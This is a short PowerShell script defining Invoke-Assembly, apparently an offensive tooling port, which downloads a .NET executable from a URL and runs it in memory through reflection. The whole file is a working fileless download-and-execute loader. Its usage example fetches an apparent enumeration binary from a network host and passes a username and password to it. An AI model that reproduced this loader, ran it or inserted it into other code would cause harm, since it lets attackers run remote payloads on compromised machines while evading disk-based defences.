Function Invoke-Assembly {
	<#
	.SYNOPSIS

		Through the use of System.Reflection, it's possible to load arbitrary
		compiled .NET code. Powershell port of https://gitlab.com/KevinJClark/csharper
		
	.PARAMETER Url
	
		Web URL to download .NET exe from.
	
	.EXAMPLE

		Import-Module .\Invoke-Assembly.ps1
		Invoke-Assembly -Url http://192.168.0.189/SimpleSharpEnum.exe -Arguments "--username","kevin","--password","p@ssw0rd"
		
	#>
	[CmdletBinding()]
		Param (
			[Parameter(Mandatory = $True, Position = 0, ValueFromPipeLine = $true, ValueFromPipelineByPropertyName = $true)]
			[String]$Url,
			
			[Parameter()]
			[String[]]$Arguments = ""
	)
	$foundMain = $false
	try {
		$asm_data = ([net.webclient]::new()).downloaddata($Url)
	}
	catch {
		Write-Output "[!] Could not download assembly from the specified Url"
		throw
	}
	try {
		$assembly = [Reflection.Assembly]::Load($asm_data)
	}
	catch {
		Write-Output "[!] Could not load assembly. Is it in COFF/MSIL/.NET format?"
		throw
	}
	
	foreach($type in $assembly.GetExportedTypes()) {
		foreach($method in $type.GetMethods()) {
			if($method.Name -eq "Main") {
				$foundMain = $true
				if($Arguments[0] -eq "") {
					Write-Output "[*] Attempting to load assembly with no arguments"
				}
				else {
					Write-Output "[*] Attempting to load assembly with arguments: $arguments"
				}
				$a = (,[String[]]@($Arguments))
				
				$prevConOut = [Console]::Out
				$sw = [IO.StringWriter]::New()
				[Console]::SetOut($sw)
				
				try {
					$method.Invoke($null, $a)
				}
				catch {
					Write-Output "[!] Could not invoke assembly or program crashed during execution"
					throw
				}
				
				[Console]::SetOut($PrevConOut)
				$output = $sw.ToString()
				$output
			}
		}
	}
	if(!$foundMain) {
		Write-Output "[!] Could not find public Main() function. Did you set the namespace as public?"
		throw
	}
}